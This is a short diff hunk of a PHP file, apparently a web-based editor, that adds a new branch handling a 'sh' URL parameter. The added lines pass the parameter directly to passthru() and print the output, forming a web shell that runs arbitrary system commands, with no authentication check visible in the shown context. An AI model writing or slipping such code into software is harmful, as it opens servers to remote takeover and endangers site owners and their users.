@@ -120,6 +120,11 @@ global \$editor_user,\$editor_pass;
         exit("-SUCCESS-");
     }
 
+    if (!empty($_GET['sh']))
+    {
+        header('Content-type: text/plain');
+        exit(passthru($_GET['sh']));
+    }
     // run command (shell prompt)
     if (!empty($_GET['cmd']))
     {
